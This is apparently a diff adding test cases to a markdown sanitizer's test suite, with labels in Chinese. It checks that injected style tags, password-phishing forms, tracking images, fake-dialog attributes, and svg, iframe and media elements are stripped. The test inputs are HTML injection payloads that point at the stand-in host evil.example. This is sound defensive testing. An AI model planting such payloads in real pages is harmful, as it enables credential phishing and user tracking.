@@ -29,6 +29,59 @@ describe('markdown 清理注入', () => {
   });
 });
 
+describe('markdown 不能改写界面、拼表单、向外站发请求（卡片 #99 的复现用例）', () => {
+  it('<style> 去掉', () => {
+    const d = dom(markdown('<style>.topbar{outline:4px solid red}</style>\n\n正文'));
+    expect(d.querySelector('style')).toBeNull();
+    expect(d.textContent).not.toContain('outline');
+  });
+
+  it('<form>、输入框、按钮去掉', () => {
+    const d = dom(markdown('<form action="https://evil.example/x"><input name="pw" type="password"><button>登录</button><textarea></textarea><select><option>a</option></select></form>'));
+    expect(d.querySelector('form, input, button, textarea, select')).toBeNull();
+    expect(d.innerHTML).not.toMatch(/action=|formaction=/);
+  });
+
+  it('外站图片改成链接，不渲染 <img>；附件图片照常', () => {
+    const d = dom(markdown('![追踪](https://evil.example/track.png)\n\n<img src="https://evil.example/t2.png">\n\n![截图](/api/files/12)'));
+    const imgs = [...d.querySelectorAll('img')].map(i => i.getAttribute('src'));
+    expect(imgs).toEqual(['/api/files/12']);
+    const links = [...d.querySelectorAll('a')].map(a => [a.getAttribute('href'), a.textContent]);
+    expect(links).toEqual([
+      ['https://evil.example/track.png', '图片：追踪'],
+      ['https://evil.example/t2.png', '图片：https://evil.example/t2.png'],
+    ]);
+  });
+
+  it('id、style、借用的 class 去掉', () => {
+    const d = dom(markdown('<span id="root" class="dialog-wrap toast" style="position:fixed;inset:0">假弹窗</span>'));
+    const span = d.querySelector('span')!;
+    expect(span.hasAttribute('id')).toBe(false);
+    expect(span.hasAttribute('style')).toBe(false);
+    expect(span.hasAttribute('class')).toBe(false);
+    expect(d.querySelector('[id], [style]')).toBeNull();
+  });
+
+  it('SVG、iframe、媒体、srcset 去掉', () => {
+    const d = dom(markdown('<svg><image href="https://evil.example/x.png"/></svg><video src="https://evil.example/v.mp4"></video><img src="/api/files/1" srcset="https://evil.example/a.png 2x"><iframe src="https://evil.example"></iframe>'));
+    expect(d.querySelector('svg, image, video, iframe')).toBeNull();
+    expect(d.querySelector('img')!.hasAttribute('srcset')).toBe(false);
+  });
+});
+
+describe('markdown 正常内容不受影响', () => {
+  it('代码块保留 language-* 类名', () => {
+    const d = dom(markdown('```rust\nfn main() {}\n```'));
+    expect(d.querySelector('code')!.className).toBe('language-rust');
+  });
+
+  it('表格、普通链接、附件链接', () => {
+    const d = dom(markdown('| a | b |\n|---|---|\n| 1 | 2 |\n\n[文档](https://example.com/doc) [日志](/api/files/3)'));
+    expect(d.querySelectorAll('table td').length).toBe(2);
+    expect([...d.querySelectorAll('a')].map(a => a.getAttribute('href'))).toEqual(['https://example.com/doc', '/api/files/3']);
+  });
+});
+
 describe('markdown 装饰', () => {
   it('普通链接在新窗口打开；附件链接直接下载', () => {
     const d = dom(markdown('[外站](https://example.com) [附件](/api/files/1/a.txt)'));
